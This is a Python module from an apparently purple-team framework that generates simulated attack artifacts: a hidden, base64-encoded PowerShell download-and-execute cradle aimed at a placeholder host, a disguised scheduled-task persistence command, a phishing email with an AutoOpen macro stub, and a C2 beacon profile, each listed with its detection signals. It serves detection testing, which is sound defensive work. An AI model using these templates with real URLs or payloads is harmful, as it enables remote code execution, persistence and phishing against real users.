"""
`rt operator` — adversary-simulation artifact generator for AUTHORIZED purple-team
and detection-engineering exercises.

This module turns the framework's scenarios and actor TTPs into realistic but
safe-to-handle artifacts: encoded command cradles, persistence command lines,
phishing-lure document templates, and C2 configuration skeletons. It does NOT
execute payloads, establish real C2, or touch target infrastructure. Every
artifact is clearly labeled for authorized testing only.

Use cases:
- Generate a scheduled-task persistence command (T1053.005) and verify your EDR
  detection fires.
- Build a base64 PowerShell cradle (T1059.001) to test DLP/NGFW inspection.
- Produce a macro-lure Word template (T1204.002) for phishing-awareness training.
- Emit a C2 config skeleton (T1071) to tune network detection rules.
"""

import argparse
import base64
import json
import secrets
import sys
from datetime import datetime, timedelta
from pathlib import Path

import attack


AUTHORIZATION_BANNER = """
╔══════════════════════════════════════════════════════════════════════╗
║  AUTHORIZED PURPLE-TEAM / DETECTION-ENGINEERING USE ONLY             ║
║                                                                      ║
║  • Use these artifacts only on systems you own or are explicitly     ║
║    authorized to test.                                               ║
║  • Do not send generated payloads or C2 traffic to third parties.    ║
║  • Generated artifacts are intentionally benign scaffolding; they    ║
║    simulate attacker FORM, not real malicious function.              ║
╚══════════════════════════════════════════════════════════════════════╝
"""


def _random_token(n=16):
    return secrets.token_hex(n // 2)


def _b64_powershell(payload: str) -> str:
    """Return a base64-encoded PowerShell -EncodedCommand compatible string."""
    wide = payload.encode("utf-16-le")
    return base64.b64encode(wide).decode("ascii")


def artifact_cradle(args):
    """Generate an encoded PowerShell download cradle (T1059.001)."""
    url = args.url or f"http://{_random_token(8)}.example/{_random_token(6)}.bin"
    raw_ps = f"Invoke-WebRequest -Uri {url} -UseBasicParsing | Invoke-Expression"
    b64 = _b64_powershell(raw_ps)

    out = {
        "technique": "T1059.001",
        "tactic": "Execution",
        "purpose": "Simulate a common PowerShell download cradle for detection testing",
        "cleartext": raw_ps,
        "encoded_command": b64,
        "command_line": f"powershell.exe -nop -w hidden -enc {b64}",
        "detection_signals": [
            "powershell.exe with -enc / -EncodedCommand",
            "DownloadString / Invoke-WebRequest in command line",
            "Network connection from powershell.exe to rare external host",
        ],
        "note": "No real payload is downloaded; the URL should point to a test server you control.",
    }
    _emit(out, args.output)


def artifact_persistence(args):
    """Generate a scheduled-task persistence command (T1053.005)."""
    task_name = args.name or f"OneDriveSync_{_random_token(6)}"
    trigger_time = (datetime.now() + timedelta(minutes=5)).strftime("%H:%M")
    raw_ps = "Write-Host 'persistence simulation - authorized test only'"
    b64 = _b64_powershell(raw_ps)
    cmd = f"schtasks /create /tn {task_name} /tr \"powershell.exe -nop -w hidden -enc {b64}\" /sc daily /st {trigger_time} /f"

    out = {
        "technique": "T1053.005",
        "tactic": "Persistence",
        "purpose": "Simulate scheduled-task persistence for EDR/SIEM testing",
        "task_name": task_name,
        "trigger": f"daily at {trigger_time}",
        "command_line": cmd,
        "detection_signals": [
            "schtasks.exe /create",
            "Task creation Windows Event ID 4698",
            "Scheduled task executing powershell.exe -enc",
        ],
        "note": "The embedded PowerShell only prints a message. Replace with your own benign test payload.",
    }
    _emit(out, args.output)


def artifact_lure(args):
    """Generate a phishing-lure document template with a benign macro placeholder."""
    actor = args.actor or "ContosoIT"
    pretext = args.pretext or "urgent invoice review"
    subject = f"[{actor}] Action required: {pretext}"
    filename = f"{pretext.replace(' ', '_')}.docm"

    macro_placeholder = '''Sub AutoOpen()
    ' AUTHORIZED TEST MACRO — REMOVE BEFORE PRODUCTION DISTRIBUTION
    ' This placeholder simulates the document-open behavior red teams use.
    ' In a real engagement this would be replaced with a benign simulation payload.
    MsgBox "Authorized purple-team document-open simulation"
End Sub'''

    out = {
        "technique": "T1204.002",
        "tactic": "Execution",
        "purpose": "Phishing-lure document scaffolding for awareness/detection testing",
        "subject": subject,
        "filename": filename,
        "sender": f"{actor.lower()}@example.com",
        "body_template": (
            f"Please review the attached {pretext} and confirm.\n\n"
            f"If the macros do not enable automatically, click Enable Content."
        ),
        "macro_placeholder": macro_placeholder,
        "detection_signals": [
            "Office application spawning powershell.exe / cmd.exe / wscript.exe",
            "Document with VBA macros from external sender",
            "User clicks 'Enable Content' on an untrusted document",
        ],
        "note": "This is a text template only; create the .docm file manually in Word.",
    }
    _emit(out, args.output)


def artifact_c2(args):
    """Generate a C2 configuration skeleton for network-detection tuning."""
    domain = args.domain or f"{_random_token(8)}.example"
    uri_path = f"/news/{_random_token(6)}"
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    jitter = args.jitter or 30

    out = {
        "technique": "T1071",
        "tactic": "Command and Control",
        "purpose": "C2 profile skeleton to tune IDS/proxy detection rules",
        "c2_host": domain,
        "uris": [uri_path, "/api/v1/sync", "/cdn/updates"],
        "user_agent": user_agent,
        "beacon_interval_seconds": 60,
        "jitter_percent": jitter,
        "http_headers": {
            "Accept": "application/json",
            "X-Session-Id": "<random_hex_16>",
        },
        "example_beacon_url": f"https://{domain}{uri_path}",
        "detection_signals": [
            "Regular-interval HTTPS requests to rare domain",
            "User-Agent mismatch with host process",
            "URI paths like /api/v1/sync, /cdn/updates from a non-browser process",
            "Long-lived connections with low data volume",
        ],
        "note": "No real C2 server is contacted. Point this at a local test server for replay.",
    }
    _emit(out, args.output)


def _emit(data, output_path):
    """Print artifact JSON and optionally write to a file."""
    print(AUTHORIZATION_BANNER)
    print(json.dumps(data, indent=2))
    if output_path:
        path = Path(output_path)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
        print(f"\n✅ Artifact written: {path}")


# --- CLI wiring -------------------------------------------------------------
def add_arguments(p):
    sub = p.add_subparsers(dest="artifact", required=True)

    cradle = sub.add_parser("cradle", help="Generate an encoded PowerShell cradle (T1059.001)")
    cradle.add_argument("--url", help="URL referenced in the cradle")
    cradle.add_argument("-o", "--output", help="Write artifact JSON to this path")

    persist = sub.add_parser("persistence", help="Generate a scheduled-task persistence command (T1053.005)")
    persist.add_argument("--name", help="Task name")
    persist.add_argument("-o", "--output", help="Write artifact JSON to this path")

    lure = sub.add_parser("lure", help="Generate a phishing-lure document template (T1204.002)")
    lure.add_argument("--actor", help="Pretext actor name")
    lure.add_argument("--pretext", help="Email pretext")
    lure.add_argument("-o", "--output", help="Write artifact JSON to this path")

    c2 = sub.add_parser("c2", help="Generate a C2 profile skeleton (T1071)")
    c2.add_argument("--domain", help="C2 domain")
    c2.add_argument("--jitter", type=int, help="Beacon jitter percent")
    c2.add_argument("-o", "--output", help="Write artifact JSON to this path")


def handle(args):
    # Dispatch using a simple lookup instead of relying on set_defaults on nested parsers.
    dispatch = {
        "cradle": artifact_cradle,
        "persistence": artifact_persistence,
        "lure": artifact_lure,
        "c2": artifact_c2,
    }
    dispatch[args.artifact](args)


def register(subparsers):
    p = subparsers.add_parser(
        "operator",
        help="Generate adversary-simulation artifacts for authorized purple-team testing",
    )
    add_arguments(p)
    p.set_defaults(func=handle)


def main():
    p = argparse.ArgumentParser(description="Adversary artifact generator")
    add_arguments(p)
    handle(p.parse_args())


if __name__ == "__main__":
    sys.exit(main())
